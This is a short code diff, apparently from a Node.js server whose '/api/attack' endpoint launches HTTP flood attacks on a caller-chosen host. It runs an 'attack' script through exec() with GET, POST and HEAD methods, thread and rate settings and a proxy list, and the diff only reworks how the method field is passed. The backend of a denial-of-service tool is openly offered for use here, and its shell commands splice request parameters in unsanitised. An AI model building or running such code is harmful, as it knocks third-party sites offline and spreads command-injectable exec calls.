@@ -10,7 +10,7 @@ const validateInput = ({ key, host, time, method, port }) => {
   return null;
 };
 
-const executeAttack = (command, res, host, port, time, method, modul) => {
+const executeAttack = (command, res, host, port, time, modul) => {
   exec(command, (error, stdout, stderr) => {
     activeAttacks--; currentPID = null;
     if (stderr) console.error(stderr);
@@ -27,7 +27,7 @@ const executeAttack = (command, res, host, port, time, method, modul) => {
     port, 
     time, 
     modul: modulInfo,  // Thêm modul vào trong phản hồi
-    method, 
+    method: "attack",  // Giữ nguyên method là "attack"
     pid: currentPID 
   });
 };
@@ -48,11 +48,11 @@ app.get("/api/attack", (req, res) => {
     const methods = ["GET", "POST", "HEAD"];
     methods.forEach((method) => {
       const command = `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
-      executeAttack(command, res, host, port, time, method, modul);
+      executeAttack(command, res, host, port, time, modul);
     });
   } else {
     const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
-    executeAttack(command, res, host, port, time, method, modul);
+    executeAttack(command, res, host, port, time, modul);
   }
 });
 
